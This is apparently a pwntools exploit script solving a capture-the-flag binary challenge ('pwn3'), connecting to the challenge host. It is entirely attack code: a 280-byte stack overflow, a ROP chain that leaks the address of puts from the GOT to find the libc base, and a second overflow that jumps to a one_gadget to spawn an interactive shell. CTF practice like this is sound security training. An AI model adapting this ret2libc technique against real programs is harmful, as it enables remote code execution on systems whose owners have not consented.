#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('./pwn3')

host = args.HOST or 'pwn3.ctf.fifthdoma.in'
port = int(args.PORT or 9003)

if not args.REMOTE:
    libc = exe.libc
else:
    libc = ELF("./libc.so.6")

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

gdbscript = '''
tbreak main
continue
'''.format(**locals())

# -- Exploit goes here --
pop_rdi = 0x401363
payload2 = b"aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaae"

p = start()
p.recvuntil(b"sequence:")

payload1 = b"A" * 280
payload1 += p64(pop_rdi)
payload1 += p64(exe.got['puts'])
payload1 += p64(exe.symbols['puts'])
payload1 += p64(exe.symbols['main'])

p.sendline(payload1)
p.recvuntil(b"sequence:")

p.sendline(payload2)

puts_leak = u64(p.recvuntil(b"sequence:").split(b"\n")[2].ljust(8,b"\x00"))
log.info(f"puts leak @ {hex(puts_leak)}")

if not args.REMOTE:
    libc.address = puts_leak - 0x080d90
else:
    libc.address = puts_leak - 0x0875a0

log.info(f"libc base @ {hex(libc.address)}")

if not args.REMOTE:
    one_gadget = libc.address + 0xe6c81
else:
    one_gadget = libc.address + 0xe6c81

payload1 = b"A" * 280
payload1 += p64(one_gadget)

p.sendline(payload1)
p.recvuntil(b"sequence:")

p.sendline(payload2)

p.interactive()

